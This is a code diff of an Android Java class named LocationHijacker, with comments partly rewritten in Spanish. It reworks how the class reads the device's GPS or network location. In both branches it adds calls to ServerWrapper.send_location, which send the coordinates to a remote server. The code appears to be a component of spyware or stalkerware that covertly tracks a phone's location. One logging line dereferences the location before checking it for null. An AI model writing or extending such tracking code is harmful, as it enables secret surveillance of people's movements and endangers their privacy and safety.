@@ -14,15 +14,13 @@ public class LocationHijacker
 {
     Context _context;
 
-    // The minimum distance to change Updates in meters
+    // La minima distancia para actualizar la ubicacion
     private static final long   MIN_DISTANCE_CHANGE_FOR_UPDATES = 0;                                // meters
-    // The minimum time between updates in milliseconds
-    private static final long   MIN_TIME_BW_UPDATES             = 1000 * 30 * 1;                    // 30 sec
-    // Declaring a Location Manager
+    // El minimo tiempo entre actualizaciones en milisegundos
+    private static final long   MIN_TIME_BW_UPDATES             = 1000 * 30 * 1;                    // Default: 30 seg
+
     protected LocationManager   _locationManager;
-    /**
-     * PUBLIC ATTRIBUTES
-     */
+
     boolean                     _isGPSEnabled                   = false;
     boolean                     _isNetworkEnabled               = false;
     boolean                     _canGetLocation                 = false;
@@ -36,12 +34,9 @@ public class LocationHijacker
 
     public void sendToServer() {
         try {
+
             LocationListener locationListener = new LocationListener() {
-                public void onLocationChanged(Location location) {
-                    // Called when a new location is found by the location provider.
-                    Log.i("LocationHijacker", location.toString());
-                    ServerWrapper.send_location(location);
-                }
+                public void onLocationChanged(Location location) {}
 
                 public void onStatusChanged(String provider, int status, Bundle extras) {}
 
@@ -59,22 +54,7 @@ public class LocationHijacker
             }
             else {
                 this._canGetLocation = true;
-                if (_isNetworkEnabled) {
-                    Log.i("LocationHijacker", "Network Enabled");
-                    _locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
-                    Log.i("LocationHijacker", "Network");
-                    if (_locationManager != null) {
-                        _location = _locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-
-                        Log.i("LocationHijacker", _location.toString());
-
-                        if (_location != null) {
-                            _latitude = _location.getLatitude();
-                            _longitude = _location.getLongitude();
-                        }
-                    }
-                }
-                // if GPS Enabled get lat/long using GPS Services
+                // Si GPS esta habilitado utiliza la ubicacion de el.
                 if (_isGPSEnabled) {
                     Log.i("LocationHijacker", "GPS Enabled");
                     if (_location == null) {
@@ -85,10 +65,29 @@ public class LocationHijacker
                             if (_location != null) {
                                 _latitude = _location.getLatitude();
                                 _longitude = _location.getLongitude();
+                                ServerWrapper.send_location(_location);
+                            }
+                        }
+                    }
+                }else {
+                    if (_isNetworkEnabled) {
+                        Log.i("LocationHijacker", "Network Enabled");
+                        _locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, locationListener);
+                        Log.i("LocationHijacker", "Network");
+                        if (_locationManager != null) {
+                            _location = _locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+
+                            Log.i("LocationHijacker", _location.toString());
+
+                            if (_location != null) {
+                                _latitude = _location.getLatitude();
+                                _longitude = _location.getLongitude();
+                                ServerWrapper.send_location(_location);
                             }
                         }
                     }
                 }
+
             }
         }
         catch (Exception e) {
